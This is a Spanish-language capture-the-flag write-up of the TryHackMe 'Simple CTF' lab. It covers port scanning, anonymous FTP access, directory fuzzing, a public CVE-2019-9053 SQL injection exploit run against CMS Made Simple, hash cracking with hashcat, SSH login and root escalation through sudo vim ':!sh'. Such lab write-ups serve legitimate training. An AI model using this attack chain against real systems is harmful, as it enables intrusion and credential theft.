---
title: Try Hack Me Simple CTF
author: k4miyo
date: 2023-06-19
math: true
mermaid: true
image:
  path: /assets/images/thm/tryhackme.png
categories: [Easy, Linux]
tags: [Web, SSH]
ping: true
---

## Máquina Simple CTF
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.169.138.

```bash
❯ ping -c 1 10.10.169.138
PING 10.10.169.138 (10.10.169.138) 56(84) bytes of data.
64 bytes from 10.10.169.138: icmp_seq=1 ttl=63 time=188 ms

--- 10.10.169.138 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 187.725/187.725/187.725/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.169.138 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 14:20 CST
Initiating Parallel DNS resolution of 1 host. at 14:20
Completed Parallel DNS resolution of 1 host. at 14:20, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:20
Scanning 10.10.169.138 [65535 ports]
Discovered open port 21/tcp on 10.10.169.138
Discovered open port 80/tcp on 10.10.169.138
Discovered open port 2222/tcp on 10.10.169.138
Completed SYN Stealth Scan at 14:21, 26.46s elapsed (65535 total ports)
Nmap scan report for 10.10.169.138
Host is up, received user-set (0.15s latency).
Scanned at 2023-06-18 14:20:40 CST for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 21 (924B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬──────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼──────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.169.138
   5   │     [*] Open ports: 21,80,2222
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p21,80,2222 10.10.169.138 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 14:21 CST
Nmap scan report for 10.10.169.138
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.85.95
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.78 seconds

```

Observamos el puerto 21 abierto y nos indica que podríamos loguearnos como el usuario anonymous:

```bash
❯ ftp 10.10.169.138
Connected to 10.10.169.138.
220 (vsFTPd 3.0.3)
Name (10.10.169.138:k4miyo): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (115.8752 kB/s)
ftp> 
```

Encontramos un recurso **ForMitch.txt** y lo pasamos a nuestra máquina para visualizar su contenido.

```bash
❯ cat ForMitch.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: ForMitch.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Nos indica que se tiene la misma contraseña para el usuario de sistema y que además es débil. Como no tenemos mayor información, podemos tratar de encontrar recursos sobre el siito web:

```bash
❯ wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.169.138/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.169.138/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000004553:   200        126 L    1182 W     19993 Ch    "simple"                                                                                                                    
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 115.7430
Processed Requests: 6140
Filtered Requests: 6139
Requests/sec.: 53.04854
```

Vemos que se tiene el recurso **simple**, vamos a echarle un  ojo:

![""](/assets/images/thm-simplectf/simplectf.png)

Vemos que nos encontramos frente a un CMS (Gestor de contenido) y que se tiene la versión 2.2.8; por lo que podrimos buscar algun posible exploit:
- [CMS Made Simple](https://www.exploit-db.com/exploits/46635)
Para nuestro, utilizaremos el exploit en la plataforma de Github [CVE-2019-9053](https://github.com/e-renna/CVE-2019-9053):

```bash
❯ git clone https://github.com/e-renna/CVE-2019-9053
Cloning into 'CVE-2019-9053'...
remote: Enumerating objects: 23, done.
remote: Counting objects: 100% (23/23), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 23 (delta 5), reused 5 (delta 1), pack-reused 0
Receiving objects: 100% (23/23), 7.56 KiB | 7.56 MiB/s, done.
Resolving deltas: 100% (5/5), done.
❯ cd CVE-2019-9053
❯ python3 exploit.py
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
```

Ahora le pasamos los argumentos que nos indica el exploit y procedemos a ejecutarlo.

```bash
❯ python3 exploit.py -u http://10.10.169.138/simple/
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

Ya obtuvimos los datos de la inyección SQL basada en tiempo. Ahora necesitamos crackear la contraseña:

```bash
❯ hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-AMD Ryzen 7 PRO 4750G with Radeon Graphics, 5807/5871 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 68 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($salt.$pass)
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Sun Jun 18 15:00:30 2023 (0 secs)
Time.Estimated...: Sun Jun 18 15:00:30 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   188.0 kH/s (1.71ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 16384/14344385 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> cocoliso

Started: Sun Jun 18 14:59:55 2023
Stopped: Sun Jun 18 15:00:31 2023
```

Ya podemos las credenciales del usuario **mitch** y podemos acceder vía ssh:

```bash
❯ ssh mitch@10.10.169.138 -p 2222
mitch@10.10.169.138's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 
$ whoami
mitch
$ 
```

En este punto ya podemos obtener la primera flag (user.txt). Ahora debemos encontrar una forma de escalar privilegios, por lo que vamos a enumerar un poco el sistema:

```bash
mitch@Machine:~$ id
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
mitch@Machine:~$
```

Vemos que podemos ejecutar el binario `/usr/bin/vim` como **root** sin proporcionar contraseña; por lo que ya sebemos que debemos utilizar [GTFobins](https://gtfobins.github.io/):

```bash
mitch@Machine:~$ sudo /usr/bin/vim
```

Al abrir el editor `vim` escribimos `:!sh` y con esto ya podemos ejecutar comandos como el usuario **root**:

```bash  
:!sh
# whoami
root
# 
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).